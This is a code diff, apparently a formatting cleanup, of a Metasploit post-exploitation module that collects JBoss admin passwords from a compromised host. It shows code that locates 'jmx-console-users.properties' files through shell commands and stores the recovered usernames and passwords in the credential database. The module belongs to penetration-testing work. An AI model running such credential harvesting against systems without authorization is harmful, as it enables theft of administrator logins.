@@ -10,50 +10,52 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Linux::System
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name' => 'Jboss Credential Collector',
-      'Description' => %q(
-        This module can be used to extract the Jboss admin passwords for version 4,5 and 6.
-      ),
-      'License' => MSF_LICENSE,
-      'Author' => [ 'Koen Riepe (koen.riepe@fox-it.com)' ],
-      'Platform' => [ 'linux', 'win' ],
-      'SessionTypes' => [ 'meterpreter' ]
-    )
+    super(
+      update_info(
+        info,
+        'Name' => 'Jboss Credential Collector',
+        'Description' => %q{
+          This module can be used to extract the Jboss admin passwords for version 4,5 and 6.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Koen Riepe (koen.riepe@fox-it.com)' ],
+        'Platform' => [ 'linux', 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
     )
   end
 
   def report_creds(user, pass, port)
     return if (user.empty? or pass.empty?)
-      # Assemble data about the credential objects we will be creating
-      credential_data = {
-        origin_type: :session,
-        post_reference_name: self.fullname,
-        private_data: pass,
-        private_type: :password,
-        session_id: session_db_id,
-        username: user,
-        workspace_id: myworkspace_id
-      }
 
-      credential_core = create_credential(credential_data)
+    # Assemble data about the credential objects we will be creating
+    credential_data = {
+      origin_type: :session,
+      post_reference_name: self.fullname,
+      private_data: pass,
+      private_type: :password,
+      session_id: session_db_id,
+      username: user,
+      workspace_id: myworkspace_id
+    }
 
-      if not port.is_a? Integer
-        print_error('Failed to detect port, defaulting to 8080 for creds database')
-        port = 8080
-      end
+    credential_core = create_credential(credential_data)
 
-      login_data = {
-        core: credential_core,
-        status: Metasploit::Model::Login::Status::UNTRIED,
-        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
-        port: port,
-        service_name: 'jboss',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
-      }
-      create_credential_login(login_data)
+    if not port.is_a? Integer
+      print_error('Failed to detect port, defaulting to 8080 for creds database')
+      port = 8080
+    end
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+      port: port,
+      service_name: 'jboss',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+    create_credential_login(login_data)
   end
 
   def getpw(file, ports)
@@ -103,9 +105,9 @@ class MetasploitModule < Msf::Post
         home = readhome(cmd_exec('printenv').split("\n"))
         pwfiles = getpwfiles(cmd_exec('locate jmx-console-users.properties').split("\n"), home, version)
         listenports = getports(version)
-        getpw(pwfiles,listenports)
+        getpw(pwfiles, listenports)
       end
-      i+=1
+      i += 1
     end
   end
 
